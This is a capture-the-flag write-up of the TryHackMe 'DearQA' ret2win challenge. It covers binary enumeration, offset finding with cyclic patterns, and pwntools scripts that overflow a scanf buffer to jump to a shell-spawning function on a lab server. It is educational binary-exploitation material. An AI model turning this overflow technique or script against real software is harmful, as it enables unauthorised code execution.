# DearQA, Buffer Overflow / Ret2Win

> **Category:** Binary Exploitation  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Techniques:** Stack Buffer Overflow · Ret2Win · No-PIE · No Canary  

---

## Overview

DearQA is a classic introductory binary exploitation challenge. The binary is a simple 64-bit ELF that asks for your name and echoes it back. No complicated libc leaks, no ROP chains, just a raw stack buffer overflow with a win function sitting in the binary waiting to be called.

My objective was to determine whether the program contained a classic stack-based buffer overflow and, if so, whether it could be leveraged to redirect execution to the hidden function.

The goal is straightforward: overflow the stack buffer, overwrite the return address, and redirect execution to a hidden function that spawns `/bin/bash`.

What makes this challenge a great learning exercise is everything it *doesn't* have, no stack canary, no PIE, no NX. Every protection is stripped away, which means the path from vulnerability to shell is direct and clear.

---

## Environment

| Property | Value |
|---|---|
| Binary | `dearqa` |
| Architecture | x86-64 (64-bit) |
| OS | Linux (Debian) |
| Compiler | GCC 4.9.2 / 4.8.4 |
| Source file (embedded) | `dearqa.c` |
| Remote target | `10.48.147.163:5700` |

---

## Initial Analysis

The first thing I always do before running any binary is look at what strings are baked into it. This is cheap, fast, and often immediately reveals the intent of the program.

### Inspecting Strings

**Command**

```bash
strings dearqa
```

**Output**

```text
/lib64/ld-linux-x86-64.so.2
libc.so.6
fflush
__isoc99_scanf
puts
printf
stdout
execve
__libc_start_main
...
Congratulations!
You have entered in the secret function!
/bin/bash
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: 
Hello: %s
...
vuln
main
__isoc99_scanf@@GLIBC_2.7
```

**Analysis**

Several things jumped out immediately:

- `execve` is imported from libc. This function is used to execute external programs, there is no reason a simple "enter your name" program would need `execve` unless there is hidden functionality.
- `/bin/bash` is stored as a string literal. Combined with `execve`, this is a very strong hint that somewhere in the binary, a shell is spawned.
- The strings `Congratulations!` and `You have entered in the secret function!` suggest a hidden function that is never called under normal program flow, a classic **win function** pattern.
- interestingly, the string vuln also appears in the binary. Since the binary is not stripped, this is likely the name of an internal function

The presence of `execve`, `/bin/bash`, and a function called `vuln` told me almost everything I needed at this stage. The challenge is almost certainly a ret2win, overflow a buffer, redirect execution to the secret function, get a shell.

Before going deeper, I ran the binary to observe its normal behavior.

---

## Running the Binary

**Command**

```bash
sudo chmod +x dearqa
./dearqa
```

**Output**

```text
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: waka
Hello: waka
```

**Analysis**

The program reads a name, then prints it back. Simple enough. I noticed there was no length limit displayed or implied. I also tried typing `/bin/bash` and a Python-style expression as input, both were just echoed back as literal strings, confirming that the input is taken raw and no shell interpretation happens at this stage.

The interesting part is what `scanf` is actually doing under the hood, which I needed to confirm through disassembly.

---

## Binary Enumeration

### Checking Security Protections

Before touching a debugger, I always run `checksec` to understand what mitigations are in play. This shapes every decision that follows.

**Command**

```bash
checksec --file=./dearqa
```

**Output**

```text
[*] '/home/wakamiya/Downloads/dearqa'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

**Analysis**

This output is a binary exploitation beginner's dream. Let's break down what each line means:

| Protection | Status | What It Means |
|---|---|---|
| RELRO | No RELRO | GOT is writable, relevant for GOT overwrites |
| Stack Canary | Not found | No secret value between buffer and return address, overflow goes straight to RIP |
| NX | Disabled / Unknown | The stack is **executable**, shellcode injection would also work here |
| PIE | Disabled | Binary loads at a fixed base address (`0x400000`) every single run |
| Symbols | Not stripped | Function names like `vuln` and `main` are visible |

The two most important findings here are:

**No stack canary**, There is nothing between my input buffer and the saved return address. If I write past the end of the buffer, I overwrite RIP directly without any detection mechanism stopping me.

**No PIE**, The binary loads at `0x400000` every time without fail. This means any address I find in `objdump` or GDB is the real runtime address. I don't need to leak a pointer or calculate offsets from a base, what I see is what I get.

These two facts together mean that a straightforward ret2win is fully viable: find the buffer size, find the win function address, build the payload.

---

## Static Analysis

### Finding the Win Function

Now that I knew there was a secret function, I needed its exact address.

**Command**

```bash
objdump -d ./dearqa | grep vuln
```

**Output**

```text
0000000000400686 <vuln>:
```

**Analysis**

The function named `vuln` lives at `0x400686`. Because PIE is disabled, this address is constant across every execution. This is my **target return address**, I want the program to jump here instead of returning normally to `main`'s caller.

### Disassembling main

Next I needed to understand exactly how the input is read, specifically which `scanf` format string is used and what the buffer size is.

**Command**

```bash
objdump -d ./dearqa | sed -n '/<main>/,/^$/p'
```

**Output**

```text
00000000004006c3 <main>:
  4006c3:       55                      push   %rbp
  4006c4:       48 89 e5                mov    %rsp,%rbp
  4006c7:       48 83 ec 20             sub    $0x20,%rsp
  ...
  4006fd:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  400701:       48 89 c6                mov    %rax,%rsi
  400704:       bf 51 08 40 00          mov    $0x400851,%edi
  400709:       b8 00 00 00 00          mov    $0x0,%eax
  40070e:       e8 6d fe ff ff          call   400580 <__isoc99_scanf@plt>
  ...
  40072e:       c9                      leave
  40072f:       c3                      ret
```

**Analysis**

Let me walk through the critical instructions:

```asm
sub    $0x20,%rsp
```
This instruction subtracts `0x20` (32 in decimal) from the stack pointer, allocating **32 bytes** of local stack space. This is the size of the input buffer.

```asm
lea    -0x20(%rbp),%rax
mov    %rax,%rsi
```
These two instructions compute the address of the local buffer (`rbp - 0x20`) and pass it as the second argument to `scanf`. So `scanf` will write user input directly into this 32-byte buffer.

```asm
mov    $0x400851,%edi
```
This loads the address `0x400851` as the first argument, the format string. I already saw from the `.rodata` dump that `0x400851` contains `%s`. No width specifier, no length limit. `scanf("%s", buf)` reads until whitespace, with absolutely no bound checking.

```asm
ret
```
After printing the echo, `main` returns. The `ret` instruction pops whatever is at the top of the stack and jumps to it. If I've overwritten the saved return address with `0x400686`, execution jumps to `vuln`.

### Confirming the Format String

I wanted to verify the format string directly.

**Command**

```bash
objdump -s -j .rodata ./dearqa
```

**Output**

```text
Contents of section .rodata:
 4007b0 01000200 00000000 436f6e67 72617475  ........Congratu
 4007c0 6c617469 6f6e7321 00000000 00000000  lations!........
 4007d0 596f7520 68617665 20656e74 65726564  You have entered
 4007e0 20696e20 74686520 73656372 65742066   in the secret f
 4007f0 756e6374 696f6e21 002f6269 6e2f6261  unction!./bin/ba
 400800 73680057 656c636f 6d652064 65617251  sh.Welcome dearQ
 ...
 400850 00257300 48656c6c 6f3a2025 730a00    .%s.Hello: %s..
```

**Analysis**

At offset `0x400851` I can see `%s`, exactly one byte past the null terminator of the preceding string. This confirms that `scanf` uses a bare `%s` with no width restriction. Any input longer than 32 bytes will silently overflow the buffer and corrupt the stack.

I also confirmed the layout of the win function strings:
- `0x4007b8` → `Congratulations!`
- `0x4007d0` → `You have entered in the secret function!`
- `0x4007f9` → `/bin/bash`

These will be printed (and `/bin/bash` will be executed via `execve`) when `vuln` is called.

---

## Dynamic Analysis

### Manual Overflow Probing

Before pulling out a cyclic pattern, I did a quick manual test to get a rough sense of where the overflow happens.

**Command**

```bash
./dearqa
# Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (32 A's)
```

**Output**

```text
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# No crash
```

**Command**

```bash
./dearqa
# Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (41 A's)
```

**Output**

```text
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./dearqa
```

**Analysis**

32 `A`s, no crash. 41 `A`s, segfault. This told me the overflow happens somewhere between 33 and 41 bytes. The buffer is 32 bytes, and then there's the saved RBP (8 bytes on x86-64) before the return address. So the total padding before overwriting RIP should be `32 + 8 = 40` bytes. The segfault at 41 bytes was consistent with that, the 41st byte was starting to corrupt the return address.

---

## Finding the Offset

### Generating a Cyclic Pattern

Manual guessing gave me a strong suspicion, but I needed a precise offset. I used `pwntools`' cyclic pattern to find the exact byte position.

**Command**

```bash
python3 -c "from pwn import *; print(cyclic(100).decode())"
```

**Output**

```text
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

**Analysis**

A cyclic pattern is a sequence where every 4-byte (or 8-byte) subsequence is unique. When a crash occurs, the value in RBP or RIP tells me exactly which part of the pattern landed there, and I can reverse-calculate the byte offset from the start.

### Crashing with the Pattern

**Command**

```bash
./dearqa
# Input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

**Output**

```text
Hello: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
zsh: segmentation fault  ./dearqa
```

Good, it crashed. Now I needed to see what value ended up in RBP.

### Inspecting the Crash in GDB

**Command**

```bash
gdb ./dearqa
(gdb) run
# Input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
(gdb) info registers
```

**Output**

```text
...
rbp            0x6161616a61616169  0x6161616a61616169
rsp            0x7fffffffdd08      0x7fffffffdd08
rip            0x40072f            0x40072f <main+108>
...
```

**Analysis**

RBP contains `0x6161616a61616169`. Let's decode that:

```
0x69 = 'i'
0x61 = 'a'
0x61 = 'a'
0x61 = 'a'
0x6a = 'j'
0x61 = 'a'
0x61 = 'a'
0x61 = 'a'
```

Reading in little-endian order (low byte first): this is the 8-byte sequence `iaaajaaa`. This means the cyclic pattern bytes `iaaajaaa` are sitting in the saved RBP slot.

RIP is at `main+108` (`0x40072f`), which is the `ret` instruction itself. The program crashed trying to return because the value it was about to pop into RIP, sitting on the stack just above where RBP was, was also corrupted.

I also examined the stack directly:

**Command**

```bash
(gdb) x/10gx $rsp
```

**Output**

```text
...
0x7fffffffdd08: 0x6161616c6161616b      0x6161616e6161616d
0x7fffffffdd18: 0x616161706161616f      0x6161617261616171
...
```

The top of the stack at RSP is `kaaalaaa`, this is the 8 bytes that `ret` would pop into RIP if it executed. Everything above RBP on the stack is also corrupted by the pattern.

### Calculating the Offset

Now I used `cyclic_find` to pinpoint where `iaaajaaa` sits within the 100-byte pattern.

**Command**

```bash
python3 -c "from pwn import *; print(cyclic_find(b'iaaajaaa', n=8))"
```

**Output** (after resolving the 4-byte vs 8-byte warning)

```text
32
```

**Analysis**

The sequence `iaaajaaa` starts at byte **32**, which is exactly where saved RBP lives on the stack. That means:

- Bytes 0–31: fill the 32-byte local buffer
- Bytes 32–39: overwrite saved RBP (8 bytes)
- Bytes 40–47: overwrite the return address (RIP)

**Total padding before RIP = 40 bytes.** My manual probing was exactly right.

---

## Understanding the Stack Layout

Here is the precise memory layout at the moment `main` returns:

```
Higher Address (toward previous stack frames)
+---------------------------+
|  Return Address (RIP)     |  ← Bytes 40–47 of our input land here
+---------------------------+
|  Saved RBP (8 bytes)      |  ← Bytes 32–39 overwrite this
+---------------------------+
|  local buffer[32 bytes]   |  ← Bytes 0–31 fill this
|  [rbp - 0x20]             |
+---------------------------+  ← RSP points here at function entry (after sub $0x20,%rsp)
Lower Address (toward stack top)
```

When `main` executes `ret`:
1. It pops the 8-byte value at RSP into RIP
2. RSP advances by 8
3. Execution jumps to whatever RIP now contains

If that value is `0x400686` (the address of `vuln`), the CPU jumps straight into the secret function.

---

## The Win Function

Before building the exploit, I confirmed what `vuln` actually does by looking at it through objdump.

**Command**

```bash
objdump -d ./dearqa | grep -A 20 '<vuln>'
```

The address `0x400686` leads to a function that prints the congratulations message and then calls `execve("/bin/bash", ...)`, effectively spawning an interactive shell. The strings I saw earlier (`/bin/bash` at `0x4007f9`) are passed as arguments to `execve`.

---

## Building the Exploit

### Logic

The exploit is simple:

1. Connect to the target (local process for testing, then remote)
2. Build a payload: 40 bytes of padding + the 8-byte little-endian address of `vuln`
3. Send it when the program asks for a name
4. Drop into an interactive shell

The address `0x400686` needs to be packed as a 64-bit little-endian integer. `pwntools`' `p64()` handles this automatically.

### Local Test

I first tested locally to confirm the offset before touching the remote server.

**Script (python.py, local version)**

```python
from pwn import *

context.binary = "./dearqa"

io = process()

payload = b"A" * 40
payload += p64(0x400686)

io.sendline(payload)
print(io.recvall(timeout=1))
```

**Output**

```text
[*] '/home/wakamiya/Downloads/dearqa'
    Arch:       amd64-64-little
    ...
[+] Starting local process '/home/wakamiya/Downloads/dearqa': pid 960154
[+] Receiving all data: Done (180B)
[*] Stopped process '/home/wakamiya/Downloads/dearqa' (pid 960154)
b"Welcome dearQA\nI am sysadmin, i am new in developing\nWhat's your name: Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06@\nCongratulations!\nYou have entered in the secret function!\n"
```

**Analysis**

The output contains `Congratulations!` and `You have entered in the secret function!`, the win function ran successfully. The address `\x86\x06@` is `0x400686` in little-endian representation, visible in the echoed name string. Execution was redirected as intended.

However, `recvall()` doesn't give me an interactive shell, it just collects all output until the process closes. I switched to `interactive()` for the real shell.

### Final Exploit (Remote)

```python
from pwn import *

io = remote("10.48.147.163", 5700)

payload = b"A" * 40 + p64(0x400686)

io.sendline(payload)
io.interactive()
```

**Breakdown of each line:**

| Line | Purpose |
|---|---|
| `io = remote("10.48.147.163", 5700)` | Opens a TCP connection to the CTF server |
| `b"A" * 40` | Fills the 32-byte buffer (0–31) and overwrites saved RBP (32–39) |
| `p64(0x400686)` | Packs the `vuln` function address as 8-byte little-endian, overwrites RIP (40–47) |
| `io.sendline(payload)` | Sends the payload followed by a newline (which `scanf` stops at) |
| `io.interactive()` | Hands control to the terminal, allowing us to type commands in the spawned shell |

---

## Result

**Command**

```bash
python3 python.py
```

**Output**

```text
[+] Opening connection to 10.48.147.163 on port 5700: Done
[*] Switching to interactive mode
...
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06@
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (621): Inappropriate ioctl for device
bash: no job control in this shell
ctf@ip-10-48-147-163:/home/ctf$ ls
DearQA  dearqa.c  flag.txt
ctf@ip-10-48-147-163:/home/ctf$ cat flag.txt
THM{REDACTED}
ctf@ip-10-48-147-163:/home/ctf$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),...
```

**Analysis**

Several things here confirm full exploitation:

- **`Congratulations! / You have entered in the secret function!`**, The win function at `0x400686` executed. Return address was successfully overwritten.
- **`bash: no job control in this shell`**, This is a normal message when `execve("/bin/bash", ...)` is called without a proper TTY. It's not an error, it's proof the shell spawned.
- **`ctf@ip-10-48-147-163:/home/ctf$`**, We are running as the `ctf` user on the remote server.
- **`cat flag.txt` → `THM{REDACTED}`**, Flag captured.

---

## Lessons Learned

### `scanf("%s")` is genuinely dangerous
There is no width specifier, no length check, no boundary, `scanf("%s", buf)` reads until it hits whitespace. If the caller allocates a 32-byte buffer and the user types 100 characters, `scanf` will happily write all 100 bytes onto the stack. The safe alternative is `scanf("%31s", buf)` or `fgets(buf, sizeof(buf), stdin)`.

### Stack layout is predictable when there's no canary
On x86-64, the function prologue (`push rbp; mov rbp, rsp; sub $N, rsp`) creates a completely deterministic layout: local variables live below RBP, and the saved return address lives just above it. Without a stack canary, nothing separates my overflowed buffer from the return address, I can overwrite RIP directly.

### Cyclic patterns make offset finding precise
Manually guessing the offset (32 A's = ok, 41 = crash) gave me the right ballpark, but the cyclic pattern gave me the exact byte with certainty. The pattern at RBP (`iaaajaaa` at offset 32) directly told me: 32 bytes to fill the buffer, 8 bytes to overwrite RBP, then RIP starts at byte 40.

### No PIE means static addresses, which means easy ret2win
With PIE disabled, the binary loads at `0x400000` every single time. The address I found in `objdump` (`0x400686`) is the exact address in every run, local or remote. If PIE were enabled, I would need an additional memory leak to calculate the base address at runtime.

### Checksec should always be the first step
Running `checksec` before anything else immediately told me the entire attack surface: no canary (can overflow RIP), no PIE (addresses are fixed), no NX (stack is even executable). These three facts together pointed directly at a ret2win with no additional complexity needed.

### `strings` can reveal program intent
Before opening GDB or objdump, `strings` told me there was a hidden function (`Congratulations!`), that it spawns a shell (`/bin/bash`, `execve`), and that a function called `vuln` exists. Static string analysis saved significant time in understanding what the binary does.

---

## Conclusion

DearQA is a textbook ret2win challenge that demonstrates every foundational concept in 64-bit binary exploitation. The vulnerability chain is clean and direct:

```
scanf("%s") with no length limit
    → stack buffer overflow
        → saved RBP overwritten (bytes 32–39)
            → return address (RIP) overwritten (bytes 40–47)
                → execution redirected to vuln() at 0x400686
                    → execve("/bin/bash") → shell
```

The absence of every modern mitigation, no canary, no PIE, no NX, means nothing stood between the overflow and full control flow hijacking. In a real-world binary, at least one of these protections would be present, and each one would require an additional technique to bypass.

For a beginner, this challenge teaches the entire ret2win methodology from first principles: enumerate the binary, understand the memory layout, find the buffer boundary, locate the target function, and craft a precise payload. Every step follows naturally from the previous one, which is exactly what binary exploitation is about.

---

*Writeup by wakamiya, TryHackMe DearQA*
